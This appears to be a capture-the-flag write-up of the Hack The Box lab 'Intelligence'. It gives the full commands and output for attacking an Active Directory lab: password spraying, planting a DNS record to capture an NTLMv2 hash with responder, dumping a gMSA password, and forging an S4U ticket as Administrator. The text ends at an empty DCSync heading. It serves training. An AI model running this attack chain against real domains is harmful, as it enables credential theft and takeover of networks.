---
title: "Hack The Box: Intelligence"
date: 2025-11-28
summary: "A Medium Windows-based machine where the target is compromised by downloading internal PDF files from a web server and extracting usernames from EXIF metadata alongside a default password. With initial SMB access, a malicious DNS entry is created to trick an automated monitoring script into authenticating, capturing an NTLMv2 hash. Privileges are then escalated by dumping a Group Managed Service Account (gMSA) password and leveraging Constrained Delegation to impersonate the Domain Administrator for DCSync."
platform: "Hack The Box"
type: "Offensive Machine"
os: "Windows"
difficulty: "Medium"
link: "https://app.hackthebox.com/machines/Intelligence"
tags:
  - ace-allowedtodelegate
  - ace-readgmsapassword
  - active-directory
  - bloodhound
  - bloodhound-ce-python
  - credentials-in-metadata
  - credentials-in-pdfs
  - dcsync
  - dnstool
  - evil-winrm
  - exiftool
  - gmsadumper-py
  - hidden-files
  - impacket-getst
  - john
  - netexec
  - nmap
  - password-spraying
  - python
  - responder
  - smbclient
  - web
---

### Provided Information

Attacker IP: 10.10.14.125

Target IP: 10.129.95.154

### Nmap Scan

```bash
$ nmap -sCV -vv -oN nmap/top-tcp 10.129.95.154
<SNIP>
PORT     STATE SERVICE       REASON          VERSION
53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus
80/tcp   open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-favicon: Unknown favicon MD5: 556F31ACD686989B1AFCF382C05846AA
|_http-title: Intelligence
88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-11-27 21:42:12Z)
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.intelligence.htb
| Issuer: commonName=intelligence-DC-CA/domainComponent=intelligence
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-04-19T00:43:16
| Not valid after:  2022-04-19T00:43:16
| MD5:   7767:9533:67fb:d65d:6065:dff7:7ad8:3e88
| SHA-1: 1555:29d9:fef8:1aec:41b7:dab2:84d7:0f9d:30c7:bde7
| -----BEGIN CERTIFICATE-----
<SNIP>
|_-----END CERTIFICATE-----
|_ssl-date: 2025-11-27T21:43:38+00:00; 0s from scanner time.
445/tcp  open  microsoft-ds? syn-ack ttl 127
464/tcp  open  kpasswd5?     syn-ack ttl 127
593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-11-27T21:43:37+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.intelligence.htb
| Issuer: commonName=intelligence-DC-CA/domainComponent=intelligence
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-04-19T00:43:16
| Not valid after:  2022-04-19T00:43:16
| MD5:   7767:9533:67fb:d65d:6065:dff7:7ad8:3e88
| SHA-1: 1555:29d9:fef8:1aec:41b7:dab2:84d7:0f9d:30c7:bde7
| -----BEGIN CERTIFICATE-----
<SNIP>
|_-----END CERTIFICATE-----
3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-11-27T21:43:38+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.intelligence.htb
| Issuer: commonName=intelligence-DC-CA/domainComponent=intelligence
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-04-19T00:43:16
| Not valid after:  2022-04-19T00:43:16
| MD5:   7767:9533:67fb:d65d:6065:dff7:7ad8:3e88
| SHA-1: 1555:29d9:fef8:1aec:41b7:dab2:84d7:0f9d:30c7:bde7
| -----BEGIN CERTIFICATE-----
<SNIP>
|_-----END CERTIFICATE-----
3269/tcp open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-11-27T21:43:37+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.intelligence.htb
| Issuer: commonName=intelligence-DC-CA/domainComponent=intelligence
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-04-19T00:43:16
| Not valid after:  2022-04-19T00:43:16
| MD5:   7767:9533:67fb:d65d:6065:dff7:7ad8:3e88
| SHA-1: 1555:29d9:fef8:1aec:41b7:dab2:84d7:0f9d:30c7:bde7
| -----BEGIN CERTIFICATE-----
<SNIP>
|_-----END CERTIFICATE-----
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 41024/tcp): CLEAN (Timeout)
|   Check 2 (port 36272/tcp): CLEAN (Timeout)
|   Check 3 (port 56957/udp): CLEAN (Timeout)
|   Check 4 (port 43711/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time:
|   date: 2025-11-27T21:42:58
|_  start_date: N/A
|_clock-skew: mean: 0s, deviation: 0s, median: 0s
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
<SNIP>
```

The target seems to be a domain controller as seen from the pattern of running services.

Let’s create a hosts file and sync the system clock with the target clock:

```bash
$ netexec smb 10.129.95.154 --generate-hosts-file hosts
SMB         10.129.95.154   445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)

$ cat hosts | sudo tee -a /etc/hosts
10.129.95.154     DC.intelligence.htb intelligence.htb DC
```

```bash
$ sudo ntpdate 10.129.95.154
```

### Enumerating SMB

Let’s start by checking what shares can null or guest users access:

```bash
$ netexec smb intelligence.htb -u guest -p '' --shares
SMB         10.129.95.154   445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
SMB         10.129.95.154   445    DC               [-] intelligence.htb\guest: STATUS_ACCOUNT_DISABLED

$ netexec smb intelligence.htb -u '' -p '' --shares
SMB         10.129.95.154   445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
SMB         10.129.95.154   445    DC               [+] intelligence.htb\:
SMB         10.129.95.154   445    DC               [-] Error enumerating shares: STATUS_ACCESS_DENIED
```

Both failed enumerating shares.

Guest account is disabled.

### Enumerating HTTP

Let’s check the running website:

![Figure 1](/assets/images/writeups/hack-the-box-intelligence/hack-the-box-intelligence-fig-2.png)

<figcaption class="blog-image-caption">Figure 1</figcaption>

Nothing about the website seems too attractive. It is static and doesn’t contain much.

## Enumerating Usernames and Passwords from Fuzzed PDFs

### Extracting Default Password

There are two links redirecting to PDFs that contain not-so-useful data:

![Figure 2](/assets/images/writeups/hack-the-box-intelligence/hack-the-box-intelligence-fig-3.png)

<figcaption class="blog-image-caption">Figure 2</figcaption>

![Figure 3](/assets/images/writeups/hack-the-box-intelligence/hack-the-box-intelligence-fig-4.png)

<figcaption class="blog-image-caption">Figure 3</figcaption>

![Figure 4](/assets/images/writeups/hack-the-box-intelligence/hack-the-box-intelligence-fig-5.png)

<figcaption class="blog-image-caption">Figure 4</figcaption>

However, notice how the URLs follow this pattern:

```bash
http://intelligence.htb/documents/2020-<Month>-<Day>-upload.pdf
```

Let’s try fuzzing for more files through following the pattern.

Since there are 365 possible combinations it won’t be ideal to do this job manually, so let’s use the following Python script to automate the downloading process of any identified PDFs by HTTP 200 OK status code:

```bash
import requests

base_url = "http://intelligence.htb/documents/2020-{}-{}-upload.pdf"

for month in range(1, 13):
    month_str = f"{month:02d}"

    for day in range(1, 32):
        day_str = f"{day:02d}"
        url = base_url.format(month_str, day_str)

        try:
            response = requests.get(url, timeout=5)

            if response.status_code == 200:
                filename = f"2020-{month_str}-{day_str}-upload.pdf"
                with open(filename, "wb") as f:
                    f.write(response.content)

                print(f"[+] Found and saved: {filename}")

        except requests.RequestException:
            pass
```

To use it, just save it and execute:

```bash
python3 downloadpdfs.py
```

The results are way more than expected:

```bash
$ ls
2020-01-01-upload.pdf  2020-02-11-upload.pdf  2020-03-17-upload.pdf  2020-05-11-upload.pdf  2020-06-07-upload.pdf  2020-06-28-upload.pdf  2020-08-09-upload.pdf  2020-09-16-upload.pdf  2020-11-06-upload.pdf  2020-12-24-upload.pdf
2020-01-02-upload.pdf  2020-02-17-upload.pdf  2020-03-21-upload.pdf  2020-05-17-upload.pdf  2020-06-08-upload.pdf  2020-06-30-upload.pdf  2020-08-19-upload.pdf  2020-09-22-upload.pdf  2020-11-10-upload.pdf  2020-12-28-upload.pdf
2020-01-04-upload.pdf  2020-02-23-upload.pdf  2020-04-02-upload.pdf  2020-05-20-upload.pdf  2020-06-12-upload.pdf  2020-07-02-upload.pdf  2020-08-20-upload.pdf  2020-09-27-upload.pdf  2020-11-11-upload.pdf  2020-12-30-upload.pdf
2020-01-10-upload.pdf  2020-02-24-upload.pdf  2020-04-04-upload.pdf  2020-05-21-upload.pdf  2020-06-14-upload.pdf  2020-07-06-upload.pdf  2020-09-02-upload.pdf  2020-09-29-upload.pdf  2020-11-13-upload.pdf  downloadpdfs.py
2020-01-20-upload.pdf  2020-02-28-upload.pdf  2020-04-15-upload.pdf  2020-05-24-upload.pdf  2020-06-15-upload.pdf  2020-07-08-upload.pdf  2020-09-04-upload.pdf  2020-09-30-upload.pdf  2020-11-24-upload.pdf
2020-01-22-upload.pdf  2020-03-04-upload.pdf  2020-04-23-upload.pdf  2020-05-29-upload.pdf  2020-06-21-upload.pdf  2020-07-20-upload.pdf  2020-09-05-upload.pdf  2020-10-05-upload.pdf  2020-11-30-upload.pdf
2020-01-23-upload.pdf  2020-03-05-upload.pdf  2020-05-01-upload.pdf  2020-06-02-upload.pdf  2020-06-22-upload.pdf  2020-07-24-upload.pdf  2020-09-06-upload.pdf  2020-10-19-upload.pdf  2020-12-10-upload.pdf
2020-01-25-upload.pdf  2020-03-12-upload.pdf  2020-05-03-upload.pdf  2020-06-03-upload.pdf  2020-06-25-upload.pdf  2020-08-01-upload.pdf  2020-09-11-upload.pdf  2020-11-01-upload.pdf  2020-12-15-upload.pdf
2020-01-30-upload.pdf  2020-03-13-upload.pdf  2020-05-07-upload.pdf  2020-06-04-upload.pdf  2020-06-26-upload.pdf  2020-08-03-upload.pdf  2020-09-13-upload.pdf  2020-11-03-upload.pdf  2020-12-20-upload.pdf

$ ls | wc -l
85
```

There are 84 downloaded PDFs (the decremented 1 is the Python script). It is not efficient to open them one by one and scan their contents, so let’s use another Python script to do that and look for interesting keywords that might reveal credentials or sensitive data:

```bash
import os
from pdfminer.high_level import extract_text

keywords = ["user", "pass", "update", "default", "login", "credential"]

pdf_files = [f for f in os.listdir(".") if f.lower().endswith(".pdf")]

for pdf in pdf_files:
    try:
        text = extract_text(pdf)

        # Normalize for searching
        lower_text = text.lower()

        # Check if any keyword appears in this PDF
        matches = [kw for kw in keywords if kw in lower_text]

        if matches:
            print(f"\n[+] Matches found in {pdf}")
            print("Keywords:", ", ".join(matches))
            print("-" * 50)

            # Print lines that contain keywords
            for line in text.splitlines():
                line_lower = line.lower()
                if any(kw in line_lower for kw in keywords):
                    print(line.strip())

    except Exception as e:
        print(f"[!] Error reading {pdf}: {e}")
```

Before running it you will need to install pdfminer, so use the following to do that quickly:

```bash
$ python3 -m venv venv && source venv/bin/activate && pip3 install pdfminer.six
```

Now let’s run it:

```bash
$ python3 searchpdfs.py

[+] Matches found in 2020-12-30-upload.pdf
Keywords: update
--------------------------------------------------
Internal IT Update

[+] Matches found in 2020-06-04-upload.pdf
Keywords: user, pass, default, login
--------------------------------------------------
Please login using your username and the default password of:
NewInt<REDACTED>
After logging in please change your password as soon as possible.
```

Nice, one PDF contained a default password.

### Extracting List of Usernames

By running `exiftool` on any PDF, an interesting notice is identified:

```bash
$ exiftool 2020-01-01-upload.pdf
ExifTool Version Number         : 13.25
File Name                       : 2020-01-01-upload.pdf
Directory                       : .
File Size                       : 27 kB
File Modification Date/Time     : 2025:11:28 02:10:08+04:00
File Access Date/Time           : 2025:11:28 02:10:17+04:00
File Inode Change Date/Time     : 2025:11:28 02:10:08+04:00
File Permissions                : -rw-rw-r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.5
Linearized                      : No
Page Count                      : 1
Creator                         : William.Lee
```

The creator field points to a username.

And by doing the same on all files, a large list of usernames is generated:

```bash
$ exiftool * | grep Creator
Creator                         : William.Lee
Creator                         : Scott.Scott
Creator                         : Jason.Wright
Creator                         : Veronica.Patel
Creator                         : Jennifer.Thomas
Creator                         : Danny.Matthews
Creator                         : David.Reed
Creator                         : Stephanie.Young
Creator                         : Daniel.Shelton
Creator                         : Jose.Williams
Creator                         : John.Coleman
Creator                         : Jason.Wright
Creator                         : Jose.Williams
Creator                         : Daniel.Shelton
Creator                         : Brian.Morris
Creator                         : Jennifer.Thomas
Creator                         : Thomas.Valenzuela
Creator                         : Travis.Evans
Creator                         : Samuel.Richardson
Creator                         : Richard.Williams
Creator                         : David.Mcbride
Creator                         : Jose.Williams
Creator                         : John.Coleman
Creator                         : William.Lee
Creator                         : Anita.Roberts
Creator                         : Brian.Baker
Creator                         : Jose.Williams
Creator                         : David.Mcbride
Creator                         : Kelly.Long
Creator                         : John.Coleman
Creator                         : Jose.Williams
Creator                         : Nicole.Brock
Creator                         : Thomas.Valenzuela
Creator                         : David.Reed
Creator                         : Kaitlyn.Zimmerman
Creator                         : Jason.Patterson
Creator                         : Thomas.Valenzuela
Creator                         : David.Mcbride
Creator                         : Darryl.Harris
Creator                         : William.Lee
Creator                         : Stephanie.Young
Creator                         : David.Reed
Creator                         : Nicole.Brock
Creator                         : David.Mcbride
Creator                         : William.Lee
Creator                         : Stephanie.Young
Creator                         : John.Coleman
Creator                         : David.Wilson
Creator                         : Scott.Scott
Creator                         : Teresa.Williamson
Creator                         : John.Coleman
Creator                         : Veronica.Patel
Creator                         : John.Coleman
Creator                         : Samuel.Richardson
Creator                         : Ian.Duncan
Creator                         : Nicole.Brock
Creator                         : William.Lee
Creator                         : Jason.Wright
Creator                         : Travis.Evans
Creator                         : David.Mcbride
Creator                         : Jessica.Moody
Creator                         : Ian.Duncan
Creator                         : Jason.Wright
Creator                         : Richard.Williams
Creator                         : Tiffany.Molina
Creator                         : Jose.Williams
Creator                         : Jessica.Moody
Creator                         : Brian.Baker
Creator                         : Anita.Roberts
Creator                         : Teresa.Williamson
Creator                         : Kaitlyn.Zimmerman
Creator                         : Jose.Williams
Creator                         : Stephanie.Young
Creator                         : Samuel.Richardson
Creator                         : Tiffany.Molina
Creator                         : Ian.Duncan
Creator                         : Kelly.Long
Creator                         : Travis.Evans
Creator                         : Ian.Duncan
Creator                         : Jose.Williams
Creator                         : David.Wilson
Creator                         : Thomas.Hall
Creator                         : Ian.Duncan
Creator                         : Jason.Patterson
```

Let’s get the unique values from them and save them into a file:

```bash
$ exiftool * | grep Creator | awk '{print $NF}' | sort | uniq > usernames.txt
```

### Password Spraying and Exploiting Tiffany

Let’s spray the identified password on the list of usernames:

```bash
$ netexec smb intelligence.htb -u usernames.txt -p NewInt<REDACTED> --continue-on-success
SMB         10.129.95.154   445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Anita.Roberts:NewInt<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Brian.Baker:NewInt<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Brian.Morris:NewInt<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Daniel.Shelton:NewInt<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Danny.Matthews:NewInt<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Darryl.Harris:NewInt<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.95.154   445    DC               [-] intelligence.htb\David.Mcbride:NewInt<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.95.154   445    DC               [-] intelligence.htb\David.Reed:NewInt<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.95.154   445    DC               [-] intelligence.htb\David.Wilson:NewInt<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Ian.Duncan:NewInt<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Jason.Patterson:NewInt<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Jason.Wright:NewInt<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Jennifer.Thomas:NewInt<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Jessica.Moody:NewInt<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.95.154   445    DC               [-] intelligence.htb\John.Coleman:NewInt<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Jose.Williams:NewInt<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Kaitlyn.Zimmerman:NewInt<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Kelly.Long:NewInt<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Nicole.Brock:NewInt<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Richard.Williams:NewInt<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Samuel.Richardson:NewInt<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Scott.Scott:NewInt<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Stephanie.Young:NewInt<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Teresa.Williamson:NewInt<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Thomas.Hall:NewInt<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Thomas.Valenzuela:NewInt<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.95.154   445    DC               [+] intelligence.htb\Tiffany.Molina:NewInt<REDACTED>
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Travis.Evans:NewInt<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Veronica.Patel:NewInt<REDACTED> STATUS_LOGON_FAILURE
SMB         10.129.95.154   445    DC               [-] intelligence.htb\William.Lee:NewInt<REDACTED> STATUS_LOGON_FAILURE
```

Nice, we got a hit on Tiffany.

### Enumerating SMB (Again)

Let’s check what SMB shares can Tiffany access:

```bash
$ netexec smb intelligence.htb -u tiffany.molina -p NewInt<REDACTED> --shares
SMB         10.129.95.154   445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
SMB         10.129.95.154   445    DC               [+] intelligence.htb\tiffany.molina:NewInt<REDACTED>
SMB         10.129.95.154   445    DC               [*] Enumerated shares
SMB         10.129.95.154   445    DC               Share           Permissions     Remark
SMB         10.129.95.154   445    DC               -----           -----------     ------
SMB         10.129.95.154   445    DC               ADMIN$                          Remote Admin
SMB         10.129.95.154   445    DC               C$                              Default share
SMB         10.129.95.154   445    DC               IPC$            READ            Remote IPC
SMB         10.129.95.154   445    DC               IT              READ
SMB         10.129.95.154   445    DC               NETLOGON        READ            Logon server share
SMB         10.129.95.154   445    DC               SYSVOL          READ            Logon server share
SMB         10.129.95.154   445    DC               Users           READ
```

Tiffany can read two interesting shares, IT and Users.

Let’s check the Users share:

```bash
$ smbclient //intelligence.htb/Users -U 'tiffany.molina%NewInt<REDACTED>'
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  DR        0  Mon Apr 19 05:20:26 2021
  ..                                 DR        0  Mon Apr 19 05:20:26 2021
  Administrator                       D        0  Mon Apr 19 04:18:39 2021
  All Users                       DHSrn        0  Sat Sep 15 11:21:46 2018
  Default                           DHR        0  Mon Apr 19 06:17:40 2021
  Default User                    DHSrn        0  Sat Sep 15 11:21:46 2018
  desktop.ini                       AHS      174  Sat Sep 15 11:11:27 2018
  Public                             DR        0  Mon Apr 19 04:18:39 2021
  Ted.Graves                          D        0  Mon Apr 19 05:20:26 2021
  Tiffany.Molina                      D        0  Mon Apr 19 04:51:46 2021

                3770367 blocks of size 4096. 1450093 blocks available
smb: \> cd Tiffany.Molina\
smb: \Tiffany.Molina\> ls
  .                                   D        0  Mon Apr 19 04:51:46 2021
  ..                                  D        0  Mon Apr 19 04:51:46 2021
  AppData                            DH        0  Mon Apr 19 04:51:46 2021
  Application Data                DHSrn        0  Mon Apr 19 04:51:46 2021
  Cookies                         DHSrn        0  Mon Apr 19 04:51:46 2021
  Desktop                            DR        0  Mon Apr 19 04:51:46 2021
  Documents                          DR        0  Mon Apr 19 04:51:46 2021
  Downloads                          DR        0  Sat Sep 15 11:12:33 2018
  Favorites                          DR        0  Sat Sep 15 11:12:33 2018
  Links                              DR        0  Sat Sep 15 11:12:33 2018
  Local Settings                  DHSrn        0  Mon Apr 19 04:51:46 2021
  Music                              DR        0  Sat Sep 15 11:12:33 2018
  My Documents                    DHSrn        0  Mon Apr 19 04:51:46 2021
  NetHood                         DHSrn        0  Mon Apr 19 04:51:46 2021
  NTUSER.DAT                        AHn   131072  Fri Nov 28 01:50:45 2025
  ntuser.dat.LOG1                   AHS    86016  Mon Apr 19 04:51:46 2021
  ntuser.dat.LOG2                   AHS        0  Mon Apr 19 04:51:46 2021
  NTUSER.DAT{6392777f-a0b5-11eb-ae6e-000c2908ad93}.TM.blf    AHS    65536  Mon Apr 19 04:51:46 2021
  NTUSER.DAT{6392777f-a0b5-11eb-ae6e-000c2908ad93}.TMContainer00000000000000000001.regtrans-ms    AHS   524288  Mon Apr 19 04:51:46 2021
  NTUSER.DAT{6392777f-a0b5-11eb-ae6e-000c2908ad93}.TMContainer00000000000000000002.regtrans-ms    AHS   524288  Mon Apr 19 04:51:46 2021
  ntuser.ini                        AHS       20  Mon Apr 19 04:51:46 2021
  Pictures                           DR        0  Sat Sep 15 11:12:33 2018
  Recent                          DHSrn        0  Mon Apr 19 04:51:46 2021
  Saved Games                         D        0  Sat Sep 15 11:12:33 2018
  SendTo                          DHSrn        0  Mon Apr 19 04:51:46 2021
  Start Menu                      DHSrn        0  Mon Apr 19 04:51:46 2021
  Templates                       DHSrn        0  Mon Apr 19 04:51:46 2021
  Videos                             DR        0  Sat Sep 15 11:12:33 2018
```

This seems to be a Windows filesystem.

It means that the `user.txt` flag should be in Tiffany’s desktop:

```bash
smb: \Tiffany.Molina\> cd Desktop
smb: \Tiffany.Molina\Desktop\> ls
  .                                  DR        0  Mon Apr 19 04:51:46 2021
  ..                                 DR        0  Mon Apr 19 04:51:46 2021
  user.txt                           AR       34  Fri Nov 28 01:41:19 2025

                3770367 blocks of size 4096. 1450093 blocks available
smb: \Tiffany.Molina\Desktop\> get user.txt
getting file \Tiffany.Molina\Desktop\user.txt of size 34 as user.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
smb: \Tiffany.Molina\Desktop\> exit

$ cat user.txt
5950fb<REDACTED>
```

### Exploiting Ted

Let’s check the contents of the IT share:

```bash
$ smbclient //intelligence.htb/IT -U 'tiffany.molina%NewInt<REDACTED>'
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Apr 19 04:50:55 2021
  ..                                  D        0  Mon Apr 19 04:50:55 2021
  downdetector.ps1                    A     1046  Mon Apr 19 04:50:55 2021

                3770367 blocks of size 4096. 1450093 blocks available
smb: \> get downdetector.ps1
getting file \downdetector.ps1 of size 1046 as downdetector.ps1 (1.2 KiloBytes/sec) (average 1.2 KiloBytes/sec)
smb: \> exit
```

```bash
$ cat downdetector.ps1
Import-Module ActiveDirectory
foreach($record in Get-ChildItem 
"AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb"
 | Where-Object Name -like "web*")  {
try {
$request = Invoke-WebRequest -Uri "http://$($record.Name)" 
-UseDefaultCredentials
if(.StatusCode -ne 200) {
Send-MailMessage -From 'Ted Graves <Ted.Graves@intelligence.htb>' 
-To 'Ted Graves <Ted.Graves@intelligence.htb>' -Subject "Host: 
$($record.Name) is down"
}
} catch {}
}
```

There is a script that checks live web servers.

It will do the following:

1. Query LDAP for computer names that start with “web”.
2. Issue a web request to that computer (server).
3. If the status code is not 200 OK, a mail will be sent to Ted.

And the script will run every 5 minutes.

Let’s abuse that to gain someone’s hash. Since there will be a web request that will occur, the hash of the requestor will likely be sent in the request, so let’s be ready to capture it.

To do so, we first need to become a computer whose name starts with “web”.

We can do that by adding a DNS record that points to the attacker machine and has a name that starts with “web” using `dnstool`:

```bash
$ python3 dnstool.py -u 'intelligence\Tiffany.Molina' -p NewInt<REDACTED> 10.129.95.154 -a add -r web-hacked -d 10.10.14.125 -t A
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Adding new record
[+] LDAP operation completed successfully
```

Now let’s set up `responder` to capture any upcoming hashes. `responder` is capable of starting web servers, so the request will surely be delivered.

```bash
$ sudo responder -v -I tun0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

<SNIP>

[+] Listening for events...
```

After waiting for few minutes, Ted’s hash is captured:

```bash
[+] Listening for events...

[HTTP] Sending NTLM authentication request to 10.129.95.154
[HTTP] GET request from: ::ffff:10.129.95.154  URL: /
[HTTP] NTLMv2 Client   : 10.129.95.154
[HTTP] NTLMv2 Username : intelligence\Ted.Graves
[HTTP] NTLMv2 Hash     : Ted.Graves::intelligence:9fecbb27690869a0:03EF60<REDACTED>
```

Perfect. Let’s attempt cracking this hash using `john`:

```bash
$ echo 'Ted.Graves::intelligence:9fecbb27690869a0:03EF60<REDACTED>' > ted.hash

$ john ted.hash -w=/usr/share/wordlists/rockyou.txt
<SNIP>
Mr.T<REDACTED>         (Ted.Graves)
<SNIP>
```

Very nice.

### Bloodhound Enumeration

Let’s map the domain using `bloodhound`.

First, let’s collect data for it using `bloodhound-ce-python`:

```bash
$ bloodhound-ce-python -d intelligence.htb -u ted.graves -p 'Mr.T<REDACTED>' -ns 10.129.95.154 -c all --zip
```

After importing the data into `bloodhound`, marking Tiffany and Ted as owned, and checking where can we go, the following interesting path is identified:

![Figure 5](/assets/images/writeups/hack-the-box-intelligence/hack-the-box-intelligence-fig-6.png)

<figcaption class="blog-image-caption">Figure 5</figcaption>

Ted is member of ITSupport group which has ReadGMSAPassword permission over Svc_int$, and the latter has AllowedToDelegate permission over DC$ which leads to DCSync and full domain compromise.

### Exploiting Svc_int$

Let’s start by reading the GMSA password of Svc_int$ using [gMSADumper](https://github.com/micahvandeusen/gMSADumper):

```bash
$ python3 gMSADumper.py -u ted.graves -p Mr.T<REDACTED> -d intelligence.htb
Users or groups who can read password for svc_int$:
 > DC$
 > itsupport
svc_int$:::538989<REDACTED>
```

Nice. No need to crack that hash as it can be passed in Pass-the-Hash attacks.

### AllowedToDelegate

Now let’s abuse the AllowedToDelegate permission that Svc-int$ has over DC$ by creating a service ticket that impersonates the Administrator.

Before that, we will need the SPN of Svc_int$, which can be found in `bloodhound`'s node data:

![Figure 6](/assets/images/writeups/hack-the-box-intelligence/hack-the-box-intelligence-fig-7.png)

<figcaption class="blog-image-caption">Figure 6</figcaption>

Now let’s create the ticket using `impacket-getST`:

```bash
$ impacket-getST -spn 'WWW/dc.intelligence.htb' -impersonate 'Administrator' -altservice 'cifs' -hashes :538989<REDACTED> 'intelligence.htb/svc_int$'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Changing service from WWW/dc.intelligence.htb@INTELLIGENCE.HTB to cifs/dc.intelligence.htb@INTELLIGENCE.HTB
[*] Saving ticket in Administrator@cifs_dc.intelligence.htb@INTELLIGENCE.HTB.ccache
```

Nice.

### DCSync

